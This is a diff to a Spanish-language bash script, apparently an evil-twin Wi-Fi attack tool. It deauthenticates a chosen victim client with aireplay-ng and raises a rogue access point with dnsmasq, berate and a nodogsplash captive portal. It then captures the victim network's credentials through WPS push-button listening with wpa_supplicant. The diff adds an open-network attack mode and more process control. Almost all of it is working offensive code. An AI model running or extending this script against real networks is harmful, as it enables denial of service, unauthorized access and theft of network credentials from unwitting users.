@@ -47,7 +47,44 @@ rm ${pwd}airodump_* 2>/dev/null
 echo -e "${VERDE}[::]${BLANCO} Todo limpio. Hasta la proxima!."; echo
 echo -e "${ROJO}[!!]${BLANCO} Te recomiendo que si vas a volver a intentar el ataque, reinicies el equipo antes. La limpieza no siempre funciona."
 }
+function abierto () {
+rm ${pwd}dnsmasq &>/dev/null
+rm /tmp/hostapd.psk &>/dev/null
+touch /tmp/hostapd.psk &>/dev/null
+cp resolv.conf ${pwd}resolv.conf &>/dev/null
+dnsmasq -C dnsmasq.conf -q --log-facility=${pwd}dnsmasq -r ${pwd}resolv.conf &
+dnsmasq_pid=$!
+bash berate_mod --vanilla --no-dnsmasq $iface_ap $iface_net $nombre_ap &>${pwd}berate &
+berate_pid=$!
+sleep 10
+grep -v WebRoot nds.conf | grep -v GatewayInterface  > nodogsplash.conf
+echo "WebRoot $ruta" >> nodogsplash.conf
+iface_nodog=`cat ${pwd}berate | grep ENABLE | cut -d ':' -f1 | uniq`
+cat ${pwd}berate | grep ENABLE | cut -d ':' -f1 | uniq > ${pwd}iface_nodog
+echo "GatewayInterface $iface_nodog" >> nodogsplash.conf
+nodogsplash -c nodogsplash.conf >${pwd}nodogsplash &
+nodogsplash_pid=$!
+dos &
+while :
+do
+sleep 30
+grep -i $mac_estacion ${pwd}berate >/dev/null
+if [ $? = 0 ];then
+        kill $pid_wps_pbc &>/dev/null
+        touch ${pwd}parar
+	kill $pid_aireplay &>/dev/null
+        echo -e "${CYAN}[AP]${VERDE}    Usuario conectado en nuestro punto de acceso! Parando DoS...${BLANCO}"
+        break
+else
+        echo -e "${CYAN}[AP]${BLANCO}	Nadie conectado todavia en nuestro punto de acceso. Seguimos..."
+fi
+done
+pbc_bucle
+}
 function crear_ap () {
+if [ $tipo = 2 ];then
+	abierto
+fi
 rm ${pwd}dnsmasq &>/dev/null
 rm /tmp/hostapd.psk &>/dev/null
 touch /tmp/hostapd.psk &>/dev/null
@@ -106,6 +143,10 @@ function comprobar_wpa () {
 while :
 do
 sleep 15
+ps fax | grep -i "wpa_supplicant -c ${pwd}pbc.conf" | grep -v grep &>/dev/null
+if [ $? -ne 0 ];then
+	escuchar_wps
+fi
 if ( grep -q "network=" ${pwd}pbc.conf ) ;
               then
                 cat ${pwd}pbc.conf | grep $nombre_ap &>/dev/null
@@ -122,7 +163,9 @@ if ( grep -q "network=" ${pwd}pbc.conf ) ;
 		break
 fi
 done
-exit
+kill $pid_comprobar_wpa &>/dev/null
+kill $$ &>/dev/null
+exit && exit
 }
 function escuchar_wps () {
 rm  ${pwd}pbc.conf &>/dev/null
@@ -134,6 +177,7 @@ echo "ctrl_interface=/var/run/wpa_supplicant
 ctrl_interface_group=root
 update_config=1" >> ${pwd}pbc.conf
 comprobar_wpa &
+pid_comprobar_wpa=$!
 wpa_supplicant -c ${pwd}pbc.conf -i "$iface_dos" -B &>${pwd}wpa_supplicant
 if [ $? != 0 ]; then
         sleep 3
@@ -142,7 +186,7 @@ fi
 crono
 }
 function crono () {
-krono=100
+krono=30
     while [ $krono -gt 0 ]; 
       do
         krono=$((krono - 1))
@@ -150,7 +194,10 @@ krono=100
     done
 sleep 2
 echo -e "${VIOLETA}[WPS]${BLANCO}	Reiniciamos escucha WPS"
-wpa_cli -i "$iface_dos" wps_pbc any &>${pwd}wpa_cli
+kill $pid_wpacli &>/dev/null
+sleep 3
+wpa_cli -i "$iface_dos" wps_pbc any &>${pwd}wpa_cli &
+pid_wpacli=$!
 crono
 }
 function pbc_bucle () {
@@ -160,6 +207,11 @@ escuchar_wps
 function comprobar () {
 clear
 banner
+if [ $tipo -eq 1 ];then
+	seguridad=protegido
+elif [ $tipo -eq 2 ];then
+	seguridad=abierto
+fi
 echo;echo -e "${AMARILLO} Vamos a comprobar todos los datos antes de empezar el ataque${BLANCO}."
 red=`cat ${pwd}elegida | cut -d ',' -f14`
 echo;echo -e "${AMARILLO}[::]${BLANCO} Red a atacar: ${VERDE} $red"
@@ -167,6 +219,7 @@ echo -e "${AMARILLO}[::]${BLANCO} Dispositivo para el ataque DoS: ${VERDE} $ifac
 echo -e "${AMARILLO}[::]${BLANCO} Dispositivo para crear el punto de acceso: ${VERDE} $iface_ap"
 echo -e "${AMARILLO}[::]${BLANCO} Cliente a atacar: ${VERDE} $mac_estacion"
 echo -e "${AMARILLO}[::]${BLANCO} Nombre de nuestra red ${VERDE} $nombre_ap"
+echo -e "${AMARILLO}[::]${BLANCO} Tipo de red ${VERDE} $seguridad"
 echo -e "${AMARILLO}[::]${BLANCO} Dispositivo para dar internet: ${VERDE} $iface_net"
 echo -e "${AMARILLO}[::]${BLANCO} Ruta de nuestro servidor http: ${VERDE} $ruta"
 echo;echo -e "${AMARILLO}[::]${BLANCO} Opciones: "
@@ -223,6 +276,7 @@ else
 	echo -e "${AMARILLO}[::]${BLANCO} reiniciando DoS..."
 fi
 aireplay-ng -0 $desaut -a $macap -c $mac_estacion $iface_mon --ignore-negative-one &>>${pwd}aireplay
+pid_aireplay=$!
 done
 echo -e "${AMARILLO}[DoS]${BLANCO}	Ataque DoS parado por completo."
 }
@@ -230,6 +284,17 @@ function config_ap () {
 clear
 banner
 echo;echo -e "${AMARILLO} Ahora toca configurar nuestro punto de acceso${BLANCO}."
+echo -e "${AMARILLO} Levantaremos un punto de acceso protegido (solo para clientes con windows) o abierto? ${BLANCO}";echo
+echo -e "		${AMARILLO}1)${BLANCO} Protegido"
+echo -e "		${AMARILLO}2)${BLANCO} Abierto"
+echo;echo -ne "${AMARILLO}[??]${BLANCO} opcion: "
+read tipo
+validar_numero $tipo config_ap
+if [ $tipo -ne 1 ] && [ $tipo -ne 2 ];then
+	echo -ne "${ROJO}[!!]${BLANCO} $tipo no es una respuesta valida. Pulsa enter para intentarlo otra vez"
+	read
+	config_ap
+fi
 echo;echo -ne "${AMARILLO}[::]${BLANCO} Nombre el punto de acceso que vamos a crear, sin espacios por favor. (Necesario): "
 read nombre_ap
 echo -ne "${AMARILLO}[::]${BLANCO} Iface con la que daremos internet su fuera necesario. Si no tienes ni idea de que es esto, da enter y ya: "
@@ -373,7 +438,7 @@ function airodump () {
 clear
 banner
 echo;echo -e "${AMARILLO}[::]${BLANCO} Ahora lo que haremos sera escanear para buscar una victima."
-echo -e "${AMARILLO}[::]${BLANCO} Vamos a iniciar el escaneo. Ten en cuenta que necesitamos al menos un cliente con windows."
+echo -e "${AMARILLO}[::]${BLANCO} Vamos a iniciar el escaneo. Ten en cuenta que necesitamos al menos un cliente con windows para el punto de acceso protegido."
 echo -e "${AMARILLO}[::]${BLANCO} Quiza tengas que reducir el tama;o de la fuente de tu consola para ver bien el escaneo."
 echo -e "${AMARILLO}[::]${BLANCO} Cuando creas que ya es suficiente, cierra aierodump con ctrl+c y el script seguira su marcha."
 echo -ne "${AMARILLO}[::]${BLANCO} Pulsa enter para iniciar el escaneo"
